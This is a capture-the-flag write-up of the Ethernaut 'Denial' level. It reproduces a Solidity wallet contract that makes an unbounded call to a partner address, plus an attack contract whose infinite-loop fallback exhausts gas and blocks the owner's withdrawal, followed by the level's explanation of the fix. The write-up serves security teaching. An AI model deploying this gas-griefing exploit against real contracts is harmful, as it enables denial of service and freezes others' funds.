<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg">

# Target Review Contract

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Challenge's message:

> This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

# Subverting

```solidity
pragma solidity ^0.8.0;

import './Denial.sol';

contract Attack{

    Denial target;

    constructor(address payable _target){
        target = Denial(_target);
        target.setWithdrawPartner(address(this));
    }

    fallback()external payable{
       while(true){

       }
    }

}
```

See [in etherscan](https://sepolia.etherscan.io/tx/0x2e4dd5819c5d06e11197c1f502769994f066dbfd3ddcd1f0a1cdfcc85e63d15d).

Ethernaut's message:

> This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified. If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value(). Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise. Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.





